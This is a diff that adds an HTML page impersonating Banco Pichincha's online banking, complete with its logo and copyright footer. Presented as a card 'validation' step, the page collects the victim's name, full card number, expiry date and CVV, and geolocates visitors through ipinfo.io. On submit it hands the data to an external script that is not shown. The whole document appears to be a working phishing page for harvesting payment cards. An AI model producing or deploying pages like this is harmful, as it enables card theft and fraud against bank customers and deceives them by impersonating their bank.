@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0;">
+        <title>Validación Pichincha</title>
+        
+
+        <link rel="stylesheet" href="/styles/styles2.css">
+        <link rel="icon" type="image/x-icon" href="/media/icon.png">
+        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script> 
+        <script>
+                    $.getJSON("https://ipinfo.io", function (response) {
+            $("#address").html("" + response.city + ", " + response.country);
+            
+                 })
+         </script>
+         
+    </head>
+    <body>
+        <header>
+            <nav id="navbar"><img src="/media/mouse-pichincha-0.jpg" id="navlogo"></nav>
+        </header>
+
+        <section id="main">
+            <div class="formbox center">
+                <div class="top">
+                    <img src="/media/6963703.png" id="ccicon" class="center">
+                    <p style="text-align: center; margin-top: 0; margin-bottom: 5px;"><strong>Valide los datos de su tarjeta</strong></p>
+                </div>  
+                <div class="form-container center">
+
+                    <form method="post" id="formdata" onsubmit=" return sender1()">
+                        <label for="names00">Nombre y Apellido</label>
+                        <div class="inputt-100" id="names00">
+                            <input type="text" placeholder="Ingresa tu nombre" id="name1" required>
+                            <input type="text" placeholder="Ingresa tu Apellido" id="lname1" required>
+                        </div>
+
+                        <label for="pass">Numero de tu Tarjeta</label>
+                        <input type="text" maxlength="16" minlength="16" autocomplete="off" placeholder="0000 0000 0000 0000" id="ccnum1" inputmode="numeric" pattern="[0-9]*" required>
+
+                       <div class="row">
+                        <div class="input-container">
+                            <label for="mmaa">Fecha de Vencimiento</label>
+                            <div class="mmaa" id="mmaa1">
+                                <select id="mm1">
+                                    <option>01</option>
+                                    <option>02</option>
+                                    <option>03</option>
+                                    <option>04</option>
+                                    <option>05</option>
+                                    <option>06</option>
+                                    <option>07</option>
+                                    <option>08</option>
+                                    <option>09</option>
+                                    <option>10</option>
+                                    <option>11</option>
+                                    <option>12</option>
+                                </select>
+                                <select id="aa1">
+                                    <option>2024</option>
+                                    <option>2025</option>
+                                    <option>2026</option>
+                                    <option>2027</option>
+                                    <option>2028</option>
+                                    <option>2029</option>
+                                    <option>2030</option>
+                                    <option>2031</option>
+                                    <option>2032</option>
+                                    <option>2033</option>
+                                </select>
+                            </div>
+                            
+                        </div>
+                        <div class="input-container">
+                            <label>CVV</label>
+                            <input type="text" placeholder="000" id="cvv1" required inputmode="numeric" maxlength="3" minlength="3">
+                            
+                        </div>
+                        <img src="/media/62936.png" id="cvvicon">
+                    </div>
+                        
+
+                        
+                        <input type="submit" id="btnSend" class="btn" value="Continuar"> 
+                    </form>
+
+                    <hr>
+
+                </div>
+            </div>
+        </section>
+        <section id="footer">
+            <p>Recomendamos usar la banca virtual con los navegadores Internet Explorer 11.0, Chrome 36.0.1, Firefox 31.0, Microsoft Edge</p>
+            <br>
+            <p>Copyright 2017 Banco Pichincha *V4.8.10b</p>
+        </section>
+
+        <script src="/validacion/sn0w-var.js"></script>
+        <script src="/scripts/act-btn.js"></script>
+    </body>
+</html>
